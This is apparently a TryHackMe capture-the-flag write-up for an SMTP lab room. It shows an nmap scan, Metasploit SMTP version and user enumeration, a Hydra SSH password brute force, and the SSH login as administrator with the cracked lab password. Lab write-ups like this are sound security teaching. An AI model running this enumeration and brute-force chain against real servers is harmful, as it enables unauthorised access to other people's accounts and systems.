---
title: TryHackMe - SMTP
description: Network Services 2 Room
date: 2024-10-17
categories:
  - ctf
tags:
  - tryhackme
  - brute force
  - mail
  - smtp
draft: false
image: smtp_exploitation.png
layout: blog-post
toc: true
---

This is a `TryHackMe Room Writeup`

> [!Reference]
> [💻 TryHackMe Network Services Room](https://tryhackme.com/r/room/networkservices2)
### SMTP Intrusion

Simple Mail Transfer Protocol aka **SMTP** allows for the process by which mail clients send mail to each other. If we were to compare the email service to the postal delivery service, SMTP would be the courier, delivering mail from the post office to the recipient's address, except in this case every address is also its own post office. The courier tends to know important information about its sender so we'll be trying to get as much information out of it as we can. Thankfully the SMTP service is very receptive to questions so we will be able to **pry valuable insights from it** in order to compromise its server.

#### Identifying the SMTP Service

The first step of identifying possible attack vectors is running a network **Nmap** scan to see what ports are open on services that we know how to abuse. In this case we're looking for **port 25** exposing the SMTP service to the internet.

Example Nmap Scan: *(NFS Scan highlighted)*

```bash
root@ip-10-10-22-136:~# IP=10.10.190.97
root@ip-10-10-22-136:~# nmap -sS -T4 -F -oN output.txt $IP

Nmap scan report for ip-10-10-190-97.eu-west-1.compute.internal (10.10.190.97)
Host is up (0.00070s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
25/tcp open  smtp
MAC Address: 02:87:B2:A3:3F:17 (Unknown)
# Nmap done at Sun Oct  6 01:22:55 2024 -- 1 IP address (1 host up) scanned in 1.68 seconds
```

> [!code]
> The call above uses the flag **-sS** to perform a stealthy SYN scan, which is faster and less detectable than a full connection scan. The **-T4** flag sets the timing template to be faster than the default, balancing speed and accuracy. The **-F** flag specifies a fast scan that targets the top 100 most common ports. The **-oN output.txt** flag saves the scan results in a normal format to a file named **output.txt**. Finally, **\$IP** specifies the target IP address for the scan."


#### Getting the SMTP server metadata

Now that we've identified a way in, we can use a pre made SMTP **attack script** to extract as much valuable metadata we can using the Metasploit smtp_version script. In this case we're able to extract the smtp server's domain name but not much else that's useful. We'll try a more **aggressive** script next.


```bash
msfconsole
msf6 > use auxiliary/scanner/smtp/smtp_version
msf6 auxiliary(scanner/smtp/smtp_version) > set RHOSTS 10.10.22.136


Module options (auxiliary/scanner/smtp/smtp_version):

Name     Current Setting  Required  Description
----     ---------------  --------  -----------
RHOSTS   10.10.22.136     yes       The target host(s), see https://docs.metasploit.com/docs/using-me
                                    tasploit/basics/using-metasploit.html
RPORT    25               yes       The target port (TCP)
THREADS  1                yes       The number of concurrent threads (max one per host)

msf6 auxiliary(scanner/smtp/smtp_version) > run

[+] 10.10.190.97:25       - 10.10.190.97:25 SMTP 220 polosmtp.home ESMTP Postfix (Ubuntu)\x0d\x0a
[*] 10.10.190.97:25       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

#### Finding the SMTP server exposed usernames
We'll try to **brute force** our SMTP courier to get it to tell us who it expects us to be talking to. We'll keep asking it whether it recognizes the name we give it with a enumeration brute force attack and hopefully we'll get a match. In this case we were able to tell that the SMTP knows the user "administrator" which gives us valuable insight into a possible user on the system. It is especially exciting to confirm the existence of an administrator user because **compromising their account can lead to unrestricted access to their entire server!**


```bash
msf6 auxiliary(scanner/smtp/smtp_version) > use /auxiliary/scanner/smtp/smtp_enum
msf6 auxiliary(scanner/smtp/smtp_enum) > set RHOSTS 10.10.190.97
msf6 auxiliary(scanner/smtp/smtp_enum) > set USER_FILE /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt
msf6 auxiliary(scanner/smtp/smtp_enum) > run


[*] 10.10.190.97:25       - 10.10.190.97:25 Banner: 220 polosmtp.home ESMTP Postfix (Ubuntu)
[+] 10.10.190.97:25       - 10.10.190.97:25 Users found: administrator
[*] 10.10.190.97:25       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

#### Running Hydra to Brute Force the password

This isn't a very *nice* way to break into a system but we'll continue to use the brute force enumeration approach along with the username we found to try to log into the server via ssh. We'll use the hydra tool to enumerate different passwords until we get one that works.

Luckily there was a **direct match** and we found a password for the administrator user, if only it was always this simple 😊

```bash
hydra -t 16 -l administrator -P /usr/share/wordlists/rockyou.txt -vV 10.10.190.97 ssh

[22][ssh] host: 10.10.190.97   login: administrator   password: alejandro
[STATUS] attack finished for 10.10.190.97 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
```

> [!Code]
> The call above uses the flag **-t 16** to spawn 16 threads to attempt logins on the specified username **-l administrator** using the filepath **-P rockyou.txt** for passwords on the server's **IP** via **ssh** in **-vV** very verbose mode." >}}

### Logging into the server with credentials

Equipped with a username and password we can easily SSH into the server unless it has other protections in place.  

```bash
ssh administrator@10.10.190.97
administrator@10.10.190.97's password: alejandro

Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-111-generic x86_64)

administrator@polosmtp:~$
```
